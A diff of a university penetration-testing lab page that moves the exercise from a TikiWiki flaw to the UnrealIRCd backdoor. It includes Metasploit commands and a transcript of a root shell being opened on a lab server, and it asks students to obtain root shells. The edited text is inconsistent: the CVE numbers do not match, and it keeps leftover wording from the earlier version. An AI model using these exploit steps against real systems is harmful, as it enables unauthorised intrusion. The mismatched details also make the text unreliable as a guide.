@@ -108,32 +108,23 @@
 </p>
 <p><img src="./Network Penetration and Security — EECS 354_files/scan_results_toplevel.png" alt="Scan Results">
 </p>
-<p>First, it is worth noting that not all of these results are particularly useful to us, regardless of severity, depending on what our objective is. For example, let's take a look at the result for UDP port 53. Nessus reports that it discovered a "Multiple Vendor DNS Query ID Field Prediction Cache Poisoning" vulnerability on the machine, which is high severity:
+<p>First, it is worth noting that not all of these results are particularly useful to us, regardless of severity, depending on what our objective is. 
 </p>
-<p><img src="./Network Penetration and Security — EECS 354_files/dns_cache_poisoning.png" alt="DNS Cache Poisoning Vulnerability">
+
+<p>Again, note the advantage of Nessus over a simple port scanner like nmap: whereas a port scanner could only tell you which ports were open, Nessus runs a battery of tests to determine what software packages are running on the server, and in many cases, even their version numbers and configuration options.
 </p>
-<p>There is a good reason why DNS cache poisoning is a high severity issue - as the description says, it could allow an attacker to redirect the users of a website to any location of the attacker's choosing. However, as our objective for this lab is to simply obtain a remote shell on the server, this vulnerability is entirely useless to us.
+<p>But, notice there is a critical level vulnerability. These are usually always related to remote code execution and are easy to obtain a shell with:
+   <code>Unreal IRC Daemon Backdoor Detection</code>
 </p>
-<p>On the other hand, let's take a look at the results for TCP port 80:
-</p>
-<p><img src="./Network Penetration and Security — EECS 354_files/port80.png" alt="TCP port 80">
-</p>
-<p>If you specified in your Scan Policy to perform web application tests, as well as to perform thorough tests under "global variable settings", Nessus should be able to detect that the server is running TikiWiki, a popular PHP-based content management system. If you view the result for "TikiWiki Detection", you will find that this service is available at the URL netsec-2.cs.northwestern.edu/tikiwiki.
-</p>
-<p>Again, note the advantage of Nessus over a simple port scanner like nmap: whereas a port scanner could only tell you that TCP port 80 was open, Nessus runs a battery of tests to determine what software packages are running on the server, and in many cases, even their version numbers and configuration options.
-</p>
-<p>Of particular interest to us is the high severity result that may potentially allow us to execute code on the server: 
-   <code>TikiWiki tiki-graph_formula.php f Parameter Arbitrary Command Execution</code>
-</p>
-<p><img src="./Network Penetration and Security — EECS 354_files/tikiwiki_graph.png" alt="Vulnerable service that may allow arbitrary command execution">
+<p><img src="./Network Penetration and Security — EECS 354_files/uircd_backdoor.png" alt="Vulnerable service that may allow arbitrary command execution">
 </p>
 <p>This looks promising. Let's try to exploit this vulnerability in Metasploit.
 </p>
 
 <h2>Performing the Exploit</h2>
-<p>To begin, note the CVE number in the Nessus scan result: CVE-2007-5423. CVE (Common Vulnerabilities and Exposures) is a large database of publicly-known security vulnerabilities, each uniquely distinguished by a "CVE Identifier" such as CVE-2007-5423. There are varying amounts of information that could be obtained about each vulnerability if you search for it on the CVE website. As it happens, the CVE entry for the vulnerability that we found does not provide any additional information beyond what Nessus had told us; however, knowing this number will nevertheless prove helpful momentarily.
+<p>To begin, note the CVE number in the Nessus scan result: CVE-2010-2075. CVE (Common Vulnerabilities and Exposures) is a large database of publicly-known security vulnerabilities, each uniquely distinguished by a "CVE Identifier" such as CVE-2010-2075. There are varying amounts of information that could be obtained about each vulnerability if you search for it on the CVE website. As it happens, the CVE entry for the vulnerability that we found does not provide any additional information beyond what Nessus had told us; however, knowing this number will nevertheless prove helpful momentarily.
 </p>
-<p>Next, connect to Metasploit using <code>msfconsole4</code>. Do not use <code>msfconsole</code> because that is not a Run a search for the CVE number:
+<p>Next, connect to Metasploit using <code>msfconsole4</code>. Run a search for the CVE number:
 </p>
 <pre><code>msf &gt; search CVE:2010-2705
 [*] Searching loaded modules for pattern 'CVE:2010-2705'...
@@ -262,7 +253,6 @@ msf exploit(unreal_ircd_3281_backdoor) &gt; exploit
 [*] Sending backdoor command...
 [*] Command shell session 2 opened (192.168.91.1:4444 -> 192.168.91.1:57361) at 2012-12-03 20:21:05 -0600
 
-whoamii
 whoami
 root
 ls
@@ -288,13 +278,11 @@ unrealircd.conf
 exit
 </code></pre>
 <h2>Class Exercise</h2>
-<p>Browse through the Nessus scan results and see if you can find another way to obtain a shell on the <code>netsec-2</code> server. Remember, not all of the vulnerabilities are useful for obtaining a shell, so you will need to read carefully through the results to find what each vulnerability can actually give you.
+<p>Browse through the Nessus scan results and see if you can find another way to obtain root access on the server. There are a few vulnerabilities, so you may be able to get a shell in more than one way. Generally, when you obtain a remote shell on a server, you will be logged in with an unprivileged account. In this lab, the critical vulnerabilitie allowed you to get access as <code>root</code> (you can find this out by running the command <code>whoami</code>). You will find there isn't much you can do with this account (try deleting or modifying <code>/var/www/index.html</code>, for example).  For this exercies, try to get a root shell. If you can get www-data access, that's half credit.
 </p>
 
 <h2>Optional Exercises</h2>
 <p><strong>Meterpreter Shell:</strong> Many exploits have the Meterpreter shell available as one of the options for the payload. Meterpreter is a fairly sophisticated post-exploitation framework that facilitates many tasks that are performed after successfully exploiting a remote host, including interacting with processes, uploading files, and interacting with the file system and the network. Meterpreter also has other important advantages for an attacker, including stealth (unlike a regular shell, Meterpreter does not spawn a new process; it also has the capability to encrypt its communication), extensibility, and familiarity (Meterpreter supports the same command set regardless of the operating system on the target machine). As an exercise, try switching the payload to a Meterpreter shell and play around with it. Use the <code>help</code> command to see which commands are available. For a more detailed overview of Meterpreter and its capabilities, take a look at the <a href="http://www.nologin.org/Downloads/Papers/meterpreter.pdf">white paper PDF</a>.
-</p>
-<p><strong>Privilege Escalation:</strong> Generally, when you obtain a remote shell on a server, you will be logged in with an unprivileged account. For example, as you saw in this lab, performing the exploit got you a shell as the <code>www-data</code> user (you can find this out by running the command <code>whoami</code>). You will find there isn't much you can do with this account (try deleting or modifying <code>/var/www/index.html</code>, for example). Try researching privilege escalation exploits and see if you can get a root shell. Note: This is not meant to be an easy exercise.
 </p>
 
   </div>
